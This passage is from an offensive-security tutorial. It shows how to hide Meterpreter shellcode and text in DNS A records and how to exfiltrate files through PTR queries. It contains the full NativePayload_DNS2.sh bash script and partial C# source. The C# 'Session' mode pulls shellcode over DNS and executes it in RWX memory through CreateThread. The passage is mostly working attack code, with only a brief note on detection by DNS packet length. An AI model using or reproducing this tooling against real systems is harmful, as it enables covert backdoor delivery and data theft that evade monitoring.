is  test 0”\n\r\n\r  t     h     I      s           I     s           t      e     s      t          0\n\r\n\r116 114 105 115 32 105 115 32 116 101 115 116 32 48\n\r\n\r116.114.105.1\n\r\n\r115.32.105.2\n\r\n\r15.32.116.3 \n\r\n\r101.115.116.4\n\r\n\r32.48.Y.5        &lt;=== Error IPv4 W.X.Y.Z\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r\n\r\n\rit means : “this  is  test 01”\n\r\n\r  t     h     I      s           I     s           t      e     s      t          0  1\n\r\n\r116 114 105 115 32 105 115 32 116 101 115 116 32 48 49 \n\r\n\r116.114.105.1\n\r\n\r115.32.105.2\n\r\n\r15.32.116.3 \n\r\n\r101.115.116.4\n\r\n\r32.48.49.5\n\r\n\r \n\r\n\rNote : if your length % 3 = 1 THEN you need add two characters to your payload\n\r\n\rNote : if your length % 3 = 2 THEN you need add one character to your payload\n\r\n\r Picture 9: Creating Text Data \n\r\n\rStep5: Dumping Text/Payload Data by (Text or Text Files) via DNS traffic (A records)\n\r\n\r \n\r\n\rin this step after fixing problem you should copy these A records to your DNS Server by hosts file and again running dnsmasq tool now by Switch “Getdata” you can download these Text data by DNS A records like “Picture 10”.\n\r\n\r \n\r\n\rso your syntax is :\n\r\n\r \n\r\n\rSyntax 1: NativePayload_DNS2.exe getdata DomainName FakeDNSserver\n\r\n\rExample 1: NativePayload_DNS2.exe getdata  Test.com   192.168.56.1\n\r\n\r \n\r\n\r  \n\r\n\r \n\r\n\rPicture 10:  Dumping Text Data\n\r\n\r \n\r\n\r\n\r\n\rExample with Error :\n\r\n\rIn this example I want to make this Text by one File with “txt” extensions.\n\r\n\ras you can see in “Picture 11” I got Error for this Text-File “1.txt” so for fixing this problem you should remove/add one or two characters from/to your String or payload.\n\r\n\r \n\r\n\rSyntax 2: NativePayload_DNS2.exe Textfile DomainName -F [TextFileName.txt]\n\r\n\rExample 2: NativePayload_DNS2.exe Textfile  Test.com  -F  1.txt\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r   \n\r\n\rPicture 11: Error\n\r\n\r \n\r\n\rso for fixing this problem I removed this text “;D” from File “1.txt” so in “Picture 12” you can see my Result without error after removing that text . \n\r\n\r \n\r\n\rPicture 12: Dumping Text Data\n\r\n\r \n\r\n\r \n\r\n\r\n\r\n\rExample with Error :\n\r\n\rWe have same Problem with Switch “Create” for Creating Meterpreter Payload.\n\r\n\rif your result for (Meterperter Payload length % 3) was not equal 0 then you can fix this Error by adding “,00” or “,00,00” like “Picture 13”.\n\r\n\r \n\r\n\r  \n\r\n\rPicture 13:\n\r\n\r \n\r\n\rIn next Picture you can See very simple an attacker can hide these C# Codes behind DNS A records :\n\r\n\r  \n\r\n\rPicture 14:\n\r\n\r \n\r\n\rIn next Picture you can See this DNS A record with length 1326 bytes: \n\r\n\r \n\r\n\rPicture 15 : Wireshark DNS A  Request/Response with length 1326 bytes\n\r\n\r \n\r\n\r\n\r\n\r \n\r\n\r \n\r\n\rUsing this Method via “NativePayload_DNS2.sh” Script on Linux systems only\n\r\n\r \n\r\n\rin this part I want to talk about this method on Linux systems only , so I made one Simple Script “NativePayload_DNS2.sh” for this method , this Script has two parts or two Example “Example-A” and “Example-B” and in this Chapter we should talk about “Example-B” and in the next chapter I will talk about this script with “Example-A”.\n\r\n\r  \n\r\n\rPicture 16: NativePayload_DNS2.sh Script Help for Syntax\n\r\n\r \n\r\n\rLinux and Creating Text/Payload Data by (Text or Text Files) via DNS traffic (A records)\n\r\n\r \n\r\n\rwith this Script “NativePayload_DNS2.sh” you can use Switches -d + “makedns” and “getdata”:\n\r\n\r“makedns” for Making DNS server and Inject Text data to DNS Zone via A records and Finally you can Dump these Records from Client side by switch “getdata”.\n\r\n\r \n\r\n\rUsing “NativePayload_DNS2.sh “ for Dump Text-data via DNS A records Step by Step :\n\r\n\r \n\r\n\rStep1: in this step you first should make DNS Server for inject Payloads to “IPv4 Addresses” , with this syntax you can Inject text file to IPv4 Addresses very simple :\n\r\n\r \n\r\n\rSyntax   : ./NativePayload_DNS2.sh -d makedns Text.txt DomainName\n\r\n\rExample : ./NativePayload_DNS2.sh -d makedns Text.txt myDomain.com\n\r\n\r \n\r\n\rin this step your Text file will inject to IPv4 Addresses then these IPv4 Addresses will Use via A records for your DomainName also dnsmasq Tool will execute by this command.\n\r\n\r Picture 17: NativePayload_DNS2.sh , dump Text-data via DNS A records \n\r\n\rStep2: in this step you can Dump/Download Text-data for text.txt file from Server-side to Client side very simple by this syntax:\n\r\n\r \n\r\n\rSyntax : ./NativePayload_DNS2.sh -d getdata DomainName DNSMASQ_IPv4\n\r\n\rExample : ./NativePayload_DNS2.sh -d getdata myDomain.com 192.168.56.110\n\r\n\r \n\r\n\ras you can see in the picture 17 these Text-data Dumped by this tool from Server-side to Client-side very simple.\n\r\n\r \n\r\n\r \n\r\n\rAt a glance :  \n\r\n\rwe should know how can Detect this type of attack , remember an attacker can do this by Chunked Packets it means they can do this by Several Domain Name and Several DNS A records then this is really difficult to detect by Monitoring so this threat is very important. Monitoring DNS Packets Length will help you in this case Because I had I big DNS A records but if attackers used this attack by Chunked Payload/Request then detecting this attack will be very difficult.\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rNativePayload_DNS2.sh\n\r\n\r \n\r\n\r #!/bin/sh\n\r\n\recho\n\r\n\recho \"NativePayload_DNS2.sh , Published by Damon Mohammadbagher 2017-2018\" \n\r\n\recho \"Injecting/Downloading/Uploading DATA to DNS Traffic via DNS A and PTR Records\"\n\r\n\recho \"help syntax: ./NativePayload_DNS2.sh help\"\n\r\n\recho\n\r\n\r        if [ $1 == \"help\" ] \n\r\n\r        then\n\r\n\r        tput setaf 2;\n\r\n\r        echo\n\r\n\r        echo \"Example A-Step1: (Server Side ) ./NativePayload_DNS2.sh -r\"\n\r\n\r        echo \"Example A-Step2: (Client Side ) ./NativePayload_DNS2.sh -u text.txt DNSMASQ_IPv4 delay(sec)\"\n\r\n\r        echo \"example IPv4:192.168.56.110 : ./NativePayload_DNS2.sh -r\"\n\r\n\r        echo \"example IPv4:192.168.56.111 : ./NativePayload_DNS2.sh -u text.txt 192.168.56.110 0\"\n\r\n\r        echo \"Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via PTR Queries to DNS server\"\n\r\n\r        echo\n\r\n\r        echo \"Example B-Step1: (Server Side ) ./NativePayload_DNS2.sh -d makedns test.txt mydomain.com\"\n\r\n\r        echo \"Example B-Step2: (Client Side ) ./NativePayload_DNS2.sh -d getdata mydomain.com DNSMASQ_IPv4\"\n\r\n\r        echo \"example IPv4:192.168.56.110 : ./NativePayload_DNS2.sh -d makedns text.txt google.com\"\n\r\n\r        echo \"example IPv4:192.168.56.111 : ./NativePayload_DNS2.sh -d getdata google.com 192.168.56.110\"\n\r\n\r        echo \"Description: with B-Step1 you will have DNS Server , with B-Step2 you can Dump test.txt file from server via A record Query\"\n\r\n\r        echo\n\r\n\r        fi\n\r\n\r \n\r\n\r        # uploading data via PTR queries (Client Side \"A\")\n\r\n\r        if [ $1 == \"-u\" ] \n\r\n\r        then\n\r\n\r                c=0                \n\r\n\r                octets=\"\"\n\r\n\r                tput setaf 9;\n\r\n\r                        for op in `xxd -p -c 1 $2`; do\n\r\n\r                        echo \"[!] injecting this text via IPv4 octet:\" \"`echo $op | xxd -r -p`\" \" ==byte==&gt; \" $op \" ==dec==&gt; \" $((16#$op)).\n\r\n\r                        octets+=$((16#$op)).                        \n\r\n\r                        ((c++))\n\r\n\r                                if(($c == 4))\n\r\n\r                                then\n\r\n\r                                tput setaf 3;\n\r\n\r                                echo \"[!] Your IPv4 is : \" \"${octets::-1}\"\n\r\n\r                                echo\n\r\n\r                                tput setaf 9;\n\r\n\r                                octets=\"\"\n\r\n\r                                c=0                                \n\r\n\r                                else\n\r\n\r                                tput setaf 9;\n\r\n\r                                fi\n\r\n\r                        done\n\r\n\r        echo\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[!] [Exfil/Uploading DATA] via PTR Record Queries\"\n\r\n\r        tput setaf 2;\n\r\n\r        echo \"[!] Sending DNS Lookup by nslookup command\"\n\r\n\r        tput setaf 2;\n\r\n\r        echo \"[!] Sending DNS Lookup to DNS Server: \" $3\n\r\n\r        echo \"[!] Sending DNS Lookup by Delay (sec): \" $4\n\r\n\r        echo\n\r\n\r        tput setaf 9;\n\r\n\r        tempip=\"\"\n\r\n\r        payload=\"\"\n\r\n\r        i=0\n\r\n\r        Lookupcount=0\n\r\n\r                for ops in `xxd -p -c 1 $2`; do\n\r\n\r                Exfil=$ops\n\r\n\r                temp=`echo $((16#$Exfil)).`\n\r\n\r                tempip+=$temp  \n\r\n\r                payload+=$tempip\n\r\n\r                ipv4=\"\"\n\r\n\r \n\r\n\r                        if(($i == 3))\n\r\n\r                        then\n\r\n\r                        ipv4+=$tempip\n\r\n\r                        tput setaf 9;\n\r\n\r                        echo \"[&gt;] [$Lookupcount] Nslookup IPv4 Address: \"  \"${ipv4::-1}\"\n\r\n\r                        tput setaf 2;\n\r\n\r                        nslookup \"${ipv4::-1}\" $3 | grep arpa\n\r\n\r                        i=0\n\r\n\r                        tempip=\"\"\n\r\n\r                        ((Lookupcount++))\n\r\n\r                        sleep $4\n\r\n\r                        else\n\r\n\r                        ((i++))\n\r\n\r                        fi\n\r\n\r \n\r\n\r                done\n\r\n\r        fi\n\r\n\r \n\r\n\r        # download data via A records queries\n\r\n\r        if [ $1 == \"-d\" ] \n\r\n\r        then\n\r\n\r \n\r\n\r        # Syntax : NativePayload_DNS2.sh -d getdata domain_name DnsMasq_IPv4\" (CLIENT SIDE \"B\")\n\r\n\r        if [ $2 == \"getdata\" ] \n\r\n\r        then        \n\r\n\r        PayloadLookups=`nslookup $3  $4 | grep  Add | sort -t. -k 4 -n`\n\r\n\r        tput setaf 9;        \n\r\n\r        echo \"[!] Downloading Mode , Dump Text DATA via DNS A Records \"        \n\r\n\r        tput setaf 2;        \n\r\n\r        echo \"[!] Sending DNS A Records Queries for Domain :\" $3 \"to DNSMASQ-Server:\" $4\n\r\n\r        echo \"[!] to dump test.txt file via A records you should use this syntax in server side:\"\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[!] Syntax : NativePayload_DNS2.sh -d makedns test.txt google.com\"\n\r\n\r        echo \"[&gt;] Dumping this Text via DNS A Record Query:\"\n\r\n\r        echo\n\r\n\r        ARecordscounter=0\n\r\n\r                for op in $PayloadLookups; do\n\r\n\r                Lookups=`echo $op | cut -d\':\' -f2`\n\r\n\r                        if [[ $Lookups != *\"#53\"* ]]; \n\r\n\r                        then\n\r\n\r                                if [[ $Lookups != *\" \"* ]]; \n\r\n\r                                then\n\r\n\r                                dec1=`echo $Lookups | cut -d\'.\' -f1`\n\r\n\r                                dec2=`echo $Lookups | cut -d\'.\' -f2`\n\r\n\r                                dec3=`echo $Lookups | cut -d\'.\' -f3`\n\r\n\r                                tput setaf 9;        \n\r\n\r                                printf \'%x\'  `echo $dec1 $dec2 $dec3` | xxd -r -p \n\r\n\r                                fi\n\r\n\r                                ((ARecordscounter++))\n\r\n\r                        fi\n\r\n\r                done\n\r\n\r                echo\n\r\n\r                echo\n\r\n\r                tput setaf 2;        \n\r\n\r                echo \"[!] Dumping Done , Performed by\" $((ARecordscounter/2)) \"DNS A Records for domain :\" $3 \"from Server:\" $4\n\r\n\r                echo\n\r\n\r \n\r\n\r \n\r\n\r        fi\n\r\n\r        # Creating DNS Server and DNSHOST.TXT file (SERVER SIDE \"B\")\n\r\n\r        # NativePayload_DNS2.sh -d makedns google.com\n\r\n\r        if [ $2 == \"makedns\" ] \n\r\n\r        then        \n\r\n\r \n\r\n\r                c=0                \n\r\n\r                octets=\"\"\n\r\n\r                tput setaf 9;\n\r\n\r                echo \" \" &gt; DnsHost.txt\n\r\n\r                SubnetHostIDcounter=0\n\r\n\r                        for op in `xxd -p -c 1 $3`; do\n\r\n\r                        echo \"[!] injecting this text via IPv4 octet:\" \"`echo $op | xxd -r -p`\" \" ==byte==&gt; \" $op \" ==dec==&gt; \" $((16#$op)).\n\r\n\r                        octets+=$((16#$op)).                        \n\r\n\r                        ((c++))\n\r\n\r                                if(($c == 3))\n\r\n\r                                then\n\r\n\r                                tput setaf 3;                                \n\r\n\r                                echo \"[!] Your IPv4 is : \" \"${octets::-1}\".$SubnetHostIDcounter\n\r\n\r                                echo \"${octets::-1}\".$SubnetHostIDcounter $4 &gt;&gt; DnsHost.txt\n\r\n\r                                tput setaf 9;\n\r\n\r                                octets=\"\"\n\r\n\r                                c=0\n\r\n\r                                ((SubnetHostIDcounter++))                                \n\r\n\r                                else\n\r\n\r                                tput setaf 9;\n\r\n\r                                fi\n\r\n\r                        \n\r\n\r                        if((SubnetHostIDcounter == 256))\n\r\n\r                        then\n\r\n\r                        echo \"[!] Oops Your IPv4 HostID was upper than 255 : \" \"${octets::-1}\".$SubnetHostIDcounter\n\r\n\r                        break\n\r\n\r                        fi\n\r\n\r                        done\n\r\n\r                        echo\n\r\n\r                        tput setaf 2;\n\r\n\r                        echo \"[!] DnsHost.txt Created by\" $SubnetHostIDcounter \"A Records for Domain:\" $4 \n\r\n\r                        echo \"[!] you can use this DNSHOST.TXT file via Dnsmasq tool\"\n\r\n\r                        tput setaf 2;\n\r\n\r                        echo \"[!] to dump these A records you should use this syntax in client side:\"\n\r\n\r                        tput setaf 9;\n\r\n\r                        echo \"[!] Syntax : NativePayload_DNS2.sh -d getdata domain_name DnsMasq_IPv4\"\n\r\n\r                        echo\n\r\n\r                        echo \"[&gt;] DNSMASQ Started by DNSHOST.TXT File\"\n\r\n\r                        echo\n\r\n\r                        tput setaf 9;\n\r\n\r                        `dnsmasq --no-hosts --no-daemon --log-queries -H DnsHost.txt`\n\r\n\r                        tput setaf 9;\n\r\n\r \n\r\n\r \n\r\n\r        fi\n\r\n\r \n\r\n\r        fi        \n\r\n\r        \n\r\n\r        # make DNS Server for Dump DATA via DNS PTR Queries (Server Side \"A\")\n\r\n\r        # Reading Mode (log data via dnsmasq log files)\n\r\n\r        if [ $1 == \"-r\" ] \n\r\n\r        then\n\r\n\r        tput setaf 9;\n\r\n\r        echo \"[&gt;] Reading Mode , DNSMASQ Started by this log file : /var/log/dnsmasq.log !\" \n\r\n\r        tput setaf 2;\n\r\n\r        echo \"\" &gt; /var/log/dnsmasq.log\n\r\n\r        `dnsmasq --no-hosts --no-daemon --log-queries --log-facility=/var/log/dnsmasq.log` &amp;\n\r\n\r        filename=\"/var/log/dnsmasq.log\"\n\r\n\r        m1=$(md5sum \"$filename\")\n\r\n\r        fs=$(stat -c%s \"$filename\")\n\r\n\r        count=0\n\r\n\r        while true; do\n\r\n\r                tput setaf 2;                \n\r\n\r                sleep 10\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r                if [ \"$fs\" != \"$fs2\" ] ; \n\r\n\r                then\n\r\n\r                \n\r\n\r                tput setaf 6;\n\r\n\r                echo \"[!] /var/log/dnsmasq.log File has changed!\"                 \n\r\n\r                echo \"[!] Checking Queries\"\n\r\n\r                fs=$(stat -c%s \"$filename\")\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r                PTRecords=`cat $filename | grep PTR  | awk {\'print $6\'}`                 \n\r\n\r                echo \"[!] Dump this Text via PTR Queries\"\n\r\n\r                tput setaf 2;\n\r\n\r                for ops1 in `echo $PTRecords`; do\n\r\n\r                ((count++))\n\r\n\r                myrecords=`echo $ops1 | cut -d\'i\' -f1`\n\r\n\r                \n\r\n\r                mydec1=`echo \"${myrecords::-1}\" | cut -d\'.\' -f4`\n\r\n\r                mydec2=`echo \"${myrecords::-1}\" | cut -d\'.\' -f3`\n\r\n\r                mydec3=`echo \"${myrecords::-1}\" | cut -d\'.\' -f2`\n\r\n\r                mydec4=`echo \"${myrecords::-1}\" | cut -d\'.\' -f1`\n\r\n\r \n\r\n\r                tput setaf 9;\n\r\n\r                if (($count == 25))\n\r\n\r                then\n\r\n\r                echo \n\r\n\r                count=0\n\r\n\r                else\n\r\n\r                printf \'%x\'  `echo $mydec1 $mydec2 $mydec3 $mydec4` | xxd -r -p \n\r\n\r                tput setaf 2\n\r\n\r                fi            \n\r\n\r                mydec=\"\"                \n\r\n\r                done \n\r\n\r                else\n\r\n\r                fs=$(stat -c%s \"$filename\")\n\r\n\r                fs2=$(stat -c%s \"$filename\")\n\r\n\r                fi\n\r\n\r        done\n\r\n\r        fi\n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\r \n\r\n\rNativePayload_DNS2 , C# Source Code :\n\r\n\rSupporting .NET 2.0 , 3.0 , 3.5 , 4.0  (Only)\n\r\n\r \n\r\n\rusing System;\n\r\n\rusing System.Collections.Generic;\n\r\n\rusing System.Diagnostics;\n\r\n\rusing System.Linq;\n\r\n\rusing System.Runtime.InteropServices;\n\r\n\rusing System.Text;\n\r\n\r \n\r\n\rnamespace NativePayload_DNS2\n\r\n\r{\n\r\n\r    class Program\n\r\n\r    {\n\r\n\r                 \n\r\n\r        static void Main(string[] args)\n\r\n\r        {\n\r\n\r           \n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGray;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.WriteLine(\"NativePayload_DNS2 , Backdoor Payload Transferring by DNS Traffic (A Records)\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(\"Published by Damon Mohammadbagher Sep 2017\");\n\r\n\r            if (args[0].ToUpper() == \"HELP\")\n\r\n\r            {\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"[!] NativePayload_DNS2 , Backdoor Payload Transferring by DNS Traffic (A Records)\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 1: Creating Meterperter Payload for Transferring by DNS A records\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 1: NativePayload_DNS2.exe \\\"Create\\\" \\\"DomainName\\\" \\\"[Meterpreter Payload]\\\"  \");\n\r\n\r                Console.WriteLine(\"[!] Example1: NativePayload_DNS2.exe Create MICROSOFT.COM \\\"fc,48,83,e4,f0,e8\\\"  \");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 2: Getting Meterpeter SESSION via DNS A records\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 2: NativePayload_DNS2.exe \\\"Session\\\" \\\"DomainName\\\" FakeDNSServer  \");\n\r\n\r                Console.WriteLine(\"[!] Example2: NativePayload_DNS2.exe Session MICROSOFT.COM 192.168.56.1  \");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 3: Creating Text DATA for Transferring by DNS A records\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 3: NativePayload_DNS2.exe \\\"TextFile\\\" \\\"DomainName\\\" \\\"[Text Data]\\\"  \");\n\r\n\r                Console.WriteLine(\"[!] Example3-1: NativePayload_DNS2.exe TextFile \\\"MICROSOFT.COM\\\" \\\"This is Test\\\"  \");\n\r\n\r                Console.WriteLine(\"[!] Example3-2: NativePayload_DNS2.exe TextFile \\\"MICROSOFT.COM\\\" -f MytxtFile.txt  \");\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.ForegroundColor = ConsoleColor.DarkCyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 4: Getting Text DATA via DNS A records\");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Cyan;\n\r\n\r                Console.WriteLine(\"[!] Syntax 4: NativePayload_DNS2.exe \\\"Getdata\\\" \\\"DomainName\\\" FakeDNSServer  \");\n\r\n\r                Console.WriteLine(\"[!] Example4: NativePayload_DNS2.exe Getdata \\\"MICROSOFT.COM\\\" 192.168.56.1  \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            }\n\r\n\r            if (args[0].ToUpper() == \"TEXTFILE\")\n\r\n\r            {\n\r\n\r \n\r\n\r                string StartAddress = \"0\";\n\r\n\r                string DomainName = args[1];\n\r\n\r                string Payload = \"\";\n\r\n\r                if (args[2].ToUpper() == \"-F\")\n\r\n\r                {\n\r\n\r                    Payload = System.IO.File.ReadAllText(args[3]);\n\r\n\r                }\n\r\n\r                else\n\r\n\r                {\n\r\n\r                    Payload = args[2];                    \n\r\n\r                }\n\r\n\r                string Temp_Hex = \"\";                \n\r\n\r                int ChechkLength = Payload.Length % 3;\n\r\n\r                \n\r\n\r \n\r\n\r               if (Payload.Length &gt; (3 * 255) || ChechkLength!=0)\n\r\n\r                {\n\r\n\r                    if (Payload.Length &gt; (3 * 255))\n\r\n\r                    {\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.WriteLine(\"[x] WOow woOw Wait , Y is your payload counter in IPv4 Address X.X.X.Y\");\n\r\n\r                        Console.WriteLine(\"[x] So your Payload \\\"X.X.X\\\" for each A Records with same Domain Name should not have Length \\\"Y\\\" more than 255 ;)\");\n\r\n\r                        Console.WriteLine(\"[x] It means your Y * 3 should not more than 255 * 3 = 765 so your Payload Length should not more than 765 ;)\");\n\r\n\r                        Console.WriteLine(\"[x] Your payload length is {0}\", Payload.Length.ToString());\n\r\n\r                        Console.WriteLine(\"[x] Information : X.X.X.Y ==&gt; 11.22.33.1 .... 11.22.33.255\");\n\r\n\r                        Console.WriteLine(\"[x] Information : in my code , 3 first octets are your payload and only last octet is your Counter for Payload Length\");\n\r\n\r                        Console.WriteLine(\"[x] Information : so you can not have Payload with more than 255 * 3 length \");\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    }\n\r\n\r                    if(ChechkLength != 0)\n\r\n\r                    {\n\r\n\r                        Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                        Console.WriteLine();\n\r\n\r                        Console.WriteLine(\"[x] Your payload length % 3 should be 0\");\n\r\n\r                        Console.WriteLine(\"[x] Your payload length is {0}\", Payload.Length.ToString());\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                        Console.WriteLine(\"[x] Your payload length % 3 = {0}\",ChechkLength.ToString());\n\r\n\r                        Console.WriteLine(\"[x] For fixing you should Remove/Add one or two strings to your payload ;)\");\n\r\n\r                        Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                    }\n\r\n\r                }\n\r\n\r                else\n\r\n\r                {\n\r\n\r                    foreach (char P in Payload)\n\r\n\r                    {\n\r\n\r                        int tmp = P;\n\r\n\r                        Temp_Hex += string.Format(\"{0:x2}\", (Int32)Convert.ToInt32(tmp.ToString())) + \",\";\n\r\n\r                    }\n\r\n\r \n\r\n\r                    SortIPAddress(Temp_Hex, StartAddress, DomainName);\n\r\n\r                }\n\r\n\r              \n\r\n\r            }\n\r\n\r \n\r\n\r            if (args[0].ToUpper() == \"CREATE\")\n\r\n\r            {\n\r\n\r                string StartAddress = \"0\";\n\r\n\r                string DomainName = args[1];\n\r\n\r                string Payload = args[2];\n\r\n\r                int Checkit = (Payload.Split(\',\').Length) % 3;\n\r\n\r                if (Checkit != 0)\n\r\n\r                {\n\r\n\r                    Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r                    Console.WriteLine();\n\r\n\r                    Console.WriteLine(\"[x] Your payload length % 3 should be 0\");\n\r\n\r                    Console.WriteLine(\"[x] Your payload length is {0}\", Payload.Split(\',\').Length.ToString());\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r                    Console.WriteLine(\"[x] Your payload length % 3 = {0}\", Checkit.ToString());\n\r\n\r                    if (Checkit == 2) Console.WriteLine(\"[x] For fixing you should Add \\\",00\\\" to your payload ;)\");\n\r\n\r                    if (Checkit == 1) Console.WriteLine(\"[x] For fixing you should Add \\\",00,00\\\" to your payload ;)\");\n\r\n\r                    Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                }\n\r\n\r                else\n\r\n\r                {\n\r\n\r                    SortIPAddress(Payload, StartAddress, DomainName);\n\r\n\r                }\n\r\n\r            }\n\r\n\r            if (args[0].ToUpper() == \"SESSION\")\n\r\n\r            {\n\r\n\r \n\r\n\r                byte[] _Exfiltration_DATA_Bytes_A_Records;\n\r\n\r                _Exfiltration_DATA_Bytes_A_Records = __nslookup(args[1], args[2]);\n\r\n\r \n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"Bingo Meterpreter session by DNS traffic (A Records) ;)\");\n\r\n\r                UInt32 funcAddr = VirtualAlloc(0, (UInt32)_Exfiltration_DATA_Bytes_A_Records.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                Marshal.Copy(_Exfiltration_DATA_Bytes_A_Records, 0, (IntPtr)(funcAddr), _Exfiltration_DATA_Bytes_A_Records.Length);\n\r\n\r                IntPtr hThread = IntPtr.Zero;\n\r\n\r                UInt32 threadId = 0;\n\r\n\r                IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                WaitForSingleObject(hThread, 0xFFFFFFFF);\n\r\n\r \n\r\n\r            }\n\r\n\r            if (args[0].ToUpper() == \"GETDATA\")\n\r\n\r            {\n\r\n\r                byte[] _Exfiltration_DATA_Bytes_A_Records;\n\r\n\r                _Exfiltration_DATA_Bytes_A_Records = __nslookup(args[1], args[2]);\n\r\n\r \n\r\n\r                Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.Write(\"[&gt;] Transfered Payload/Text Data is : \");\n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.Write(UTF8Encoding.UTF8.GetChars(_Exfiltration_DATA_Bytes_A_Records));                \n\r\n\r                Console.WriteLine();\n\r\n\r            }   \n\r\n\r           \n\r\n\r \n\r\n\r        }\n\r\n\r        public static string SortIPAddress(string _Payload,string MainIP, string String_DomainName)\n\r\n\r        {\n\r\n\r            string[] X = _Payload.Split(\',\');\n\r\n\r            string[] XX = new string[X.Length / 3];\n\r\n\r            int counter = 0;\n\r\n\r            int X_counter = 0;\n\r\n\r            string tmp = \"\";\n\r\n\r            Console.WriteLine();\n\r\n\r            for (int i = 0; i &lt; X.Length;)\n\r\n\r            {\n\r\n\r \n\r\n\r                tmp += X[i]+\",\";\n\r\n\r                i++;\n\r\n\r                counter++;\n\r\n\r                if (counter &gt;= 3)\n\r\n\r                {\n\r\n\r                    counter = 0;\n\r\n\r                    XX[X_counter] = tmp.Substring(0,tmp.Length-1);\n\r\n\r                    X_counter++;\n\r\n\r                    tmp = \"\";\n\r\n\r                }\n\r\n\r            }\n\r\n\r \n\r\n\r            string[] IP_Octets = new string[3];\n\r\n\r            string nique = \"\";\n\r\n\r            string Final_DNS_Text_File = \"\";\n\r\n\r            int Display_counter = 0;\n\r\n\r            int First_Octet = 0;\n\r\n\r            foreach (var item in XX)\n\r\n\r            {\n\r\n\r                /// First_Octet++; it means my counter for IPAddress will start by address W.X.Y.1 ...\n\r\n\r                First_Octet++;\n\r\n\r                IP_Octets = item.Split(\',\');\n\r\n\r                if (Display_counter &lt; 4)\n\r\n\r                    Console.Write(item.ToString() + \" ====&gt;  \");\n\r\n\r                foreach (string itemS in IP_Octets)\n\r\n\r                {                    \n\r\n\r                    int Tech = Int32.Parse(itemS, System.Globalization.NumberStyles.HexNumber);\n\r\n\r                    nique += (Tech.ToString() + \".\");\n\r\n\r                }\n\r\n\r                if (Display_counter &lt; 4)\n\r\n\r                    Console.WriteLine(nique.Substring(0, nique.Length - 1) + \".\" + (First_Octet + Int32.Parse(MainIP)).ToString());\n\r\n\r                Final_DNS_Text_File += nique.Substring(0, nique.Length - 1) + \".\" + (First_Octet + Int32.Parse(MainIP)).ToString() + \" \" + String_DomainName + \" \\r\\n\";\n\r\n\r                nique = \"\";\n\r\n\r                Display_counter++;\n\r\n\r            }\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.Red;\n\r\n\r            Console.WriteLine(\"Copy these A Records to /etc/hosts or DNS.TXT for Using by Dnsmasq tool\");\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine(Final_DNS_Text_File);\n\r\n\r            return \"\";\n\r\n\r        }\n\r\n\r        public static string _Records;\n\r\n\r        public static byte[] __nslookup(string DNS_PTR_A, string DnsServer)\n\r\n\r        {\n\r\n\r            /// Make DNS traffic for getting Meterpreter Payloads by nslookup\n\r\n\r            ProcessStartInfo ns_Prcs_info = new ProcessStartInfo(\"nslookup.exe\", DNS_PTR_A + \" \" + DnsServer);\n\r\n\r            ns_Prcs_info.RedirectStandardInput = true;\n\r\n\r            ns_Prcs_info.RedirectStandardOutput = true;\n\r\n\r            ns_Prcs_info.UseShellExecute = false;\n\r\n\r            /// you can use Thread Sleep here \n\r\n\r \n\r\n\r            Process nslookup = new Process();\n\r\n\r            nslookup.StartInfo = ns_Prcs_info;\n\r\n\r            nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n\r\n\r            